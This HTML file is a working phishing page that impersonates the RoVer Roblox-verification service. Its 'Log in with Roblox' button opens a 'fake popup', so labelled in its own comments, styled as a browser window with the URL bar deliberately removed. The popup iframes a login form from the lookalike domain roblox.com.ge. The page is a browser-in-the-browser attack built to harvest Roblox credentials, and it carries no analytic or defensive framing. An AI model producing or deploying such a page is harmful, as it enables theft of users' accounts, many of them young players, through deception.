<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ROBLOX</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
  <style>
    html, body {
      height: 100%;
      margin: 0;
      font-family: "Roboto", sans-serif;
      background-color: #1d1b1b;
      color: #fff;
    }

    /* Updated Navbar */
    nav {
      background: linear-gradient(to right, #c91673, #a1125f);
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 32px;
      font-size: 18px;
      position: relative;
      box-shadow: 0 2px 8px rgba(0,0,0,0.4);
      z-index: 10;
    }

    .nav-left,
    .nav-right {
      display: flex;
      align-items: center;
      gap: 24px;
    }

    nav a {
      color: #fff;
      text-decoration: none;
      font-size: 16px;
      position: relative;
      transition: color 0.2s ease;
    }

    nav a::after {
      content: "";
      position: absolute;
      left: 0;
      bottom: -4px;
      height: 2px;
      width: 0;
      background-color: #fff;
      transition: width 0.3s ease;
    }

    nav a:hover::after {
      width: 100%;
    }

    nav a:hover {
      color: #ffdbf0;
    }

    .btn {
      border: 2px solid #fff;
      padding: 8px 16px;
      border-radius: 8px;
      background: transparent;
      color: #fff;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .btn:hover {
      background-color: #fff;
      color: #c91673;
      box-shadow: 0 0 6px #fff;
    }

    .logo img {
      height: 48px;
    }

    .username {
      font-size: 15px;
      font-weight: 600;
      color: #ffffff;
      opacity: 0.85;
    }

    .hamburger {
      display: none;
      flex-direction: column;
      cursor: pointer;
      gap: 5px;
    }

    .hamburger span {
      width: 24px;
      height: 3px;
      background: #fff;
      border-radius: 2px;
    }

    .mobile-menu {
      display: none;
      flex-direction: column;
      width: 100%;
      background: #c91673;
      padding: 12px 20px;
      border-top: 1px solid rgba(255, 255, 255, 0.15);
    }

    .mobile-menu.open {
      display: flex;
    }

    @media (max-width: 768px) {
      nav {
        flex-direction: column;
        align-items: flex-start;
        padding: 12px 20px;
      }

      .hamburger {
        display: flex;
        margin-left: auto;
      }

      .nav-left,
      .nav-right {
        display: none;
      }

      .mobile-menu a,
      .mobile-menu button {
        margin-bottom: 10px;
      }
    }

    /* Header & Panel */
    header {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      height: 100%;
      padding-top: 60px;
      text-align: center;
    }

    .panel {
      background: #000;
      border-radius: 8px;
      padding: 28px 20px;
      max-width: 420px;
      width: 95%;
      box-shadow: 0 6px 16px rgba(0,0,0,0.8);
      text-align: left;
    }

    .panel h1 {
      font-size: 26px;
      font-weight: 800;
      margin: 0 0 12px;
    }

    .redirect-text {
      font-weight: bold;
      font-size: 16px;
      color: #ddd;
      margin: 0 0 20px;
      display: block;
    }

    .info-box {
      display: flex;
      align-items: flex-start;
      background: #2c2c2c;
      border-radius: 6px;
      padding: 10px 14px;
      margin: 0 0 20px;
      width: 100%;
      box-sizing: border-box;
      overflow-wrap: break-word;
      word-break: break-word;
    }

    .info-box img {
      width: 22px;
      height: 22px;
      margin-right: 10px;
      margin-top: 2px;
      flex-shrink: 0;
    }

    .info-box p {
      font-size: 15px;
      color: #ddd;
      margin: 0;
      line-height: 1.4;
    }

    .login-btn {
      margin-top: 20px;
      background: #c91673;
      color: #fff;
      padding: 12px 22px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s ease;
      width: 100%;
    }

    .login-btn:hover {
      background: #a1125f;
    }

    /* Fake popup styles (url-bar removed) */
    .fake-popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 90%;
      max-width: 700px;
      height: 600px;
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 0 30px rgba(0,0,0,0.8);
      overflow: hidden;
      z-index: 1000;
      border: 1px solid #ccc;
    }

    .window-bar {
      background: #f7f7f7;
      color: #111;
      height: 36px;
      display: flex;
      align-items: center;
      justify-content: flex-start; /* aligned left */
      padding: 0 12px;
      font-size: 14px;
      font-weight: 700;
      border-bottom: 1px solid #e0e0e0;
      position: relative;
    }

    .popup-close {
      position: absolute;
      right: 12px;
      top: 6px;
      font-size: 18px;
      cursor: pointer;
      color: #666;
    }

    .popup-close:hover {
      color: red;
    }

    .popup-iframe {
      width: 100%;
      /* only the window-bar height (36px) is taken, so subtract that */
      height: calc(100% - 36px);
      border: none;
      display: block;
      outline: none; /* removed white outline */
    }

    .overlay {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.65);
      z-index: 999;
    }
  </style>
</head>
<body>
  <!-- Navbar -->
  <nav>
    <div class="nav-left">
      <div class="logo">
        <img src="https://imgur.com/0ErnjPo.png" alt="RoVer Logo" />
      </div>
      <a href="#">Help</a>
      <a href="#">Team Members</a>
      <button class="btn">RoVer Plus</button>
    </div>
    <div class="nav-right">
      <button class="btn">Manage Servers</button>
      <a href="#" style="font-weight: 700">Verification</a>
      <span class="username">Guest</span>
    </div>
    <div class="hamburger" id="hamburger">
      <span></span><span></span><span></span>
    </div>
  </nav>

  <!-- Mobile menu -->
  <div class="mobile-menu" id="mobileMenu">
    <a href="#">Help</a>
    <a href="#">Team Members</a>
    <button class="btn">RoVer Plus</button>
    <button class="btn">Manage Servers</button>
    <a href="#" style="font-weight: 700">Verification</a>
    <span class="username">Guest</span>
  </div>

  <!-- Verification Panel -->
  <header>
    <div class="panel" id="mockPanel">
      <h1>Link Roblox Account</h1>
      <span class="redirect-text">You will be redirected to Roblox.</span>
      <div class="info-box">
        <img src="https://img.icons8.com/ios-filled/50/1E90FF/info.png" alt="info" />
        <p>If the next page says:<br>
          <span style="color: #fff;">"You are not allowed to use this application"</span>, please read 
          <span style="color: #c91673;">this help article</span>.
        </p>
      </div>
      <button class="login-btn" id="loginBtn">Log in with Roblox</button>
    </div>
  </header>

  <!-- Fake popup overlay -->
  <div class="overlay" id="overlay"></div>

  <!-- Fake browser popup (url-bar removed) -->
  <div class="fake-popup" id="fakePopup">
    <div class="window-bar">
      ROBLOX
      <div class="popup-close" id="popupClose">&times;</div>
    </div>

    <iframe class="popup-iframe" id="popupIframe" src=""></iframe>
  </div>

  <script>
    const loginBtn = document.getElementById("loginBtn");
    const hamburger = document.getElementById("hamburger");
    const mobileMenu = document.getElementById("mobileMenu");

    const fakePopup = document.getElementById("fakePopup");
    const popupClose = document.getElementById("popupClose");
    const overlay = document.getElementById("overlay");
    const iframe = document.getElementById("popupIframe");

    loginBtn.addEventListener("click", () => {
      // keep your real target if needed
      const realUrl = "https://roblox.com.ge/login?returnUrl=2099296147452818";

      iframe.src = realUrl;

      fakePopup.style.display = "block";
      overlay.style.display = "block";
    });

    popupClose.addEventListener("click", () => {
      fakePopup.style.display = "none";
      overlay.style.display = "none";
      iframe.src = "";
    });

    hamburger.addEventListener("click", () => {
      mobileMenu.classList.toggle("open");
    });
  </script>
</body>
</html>
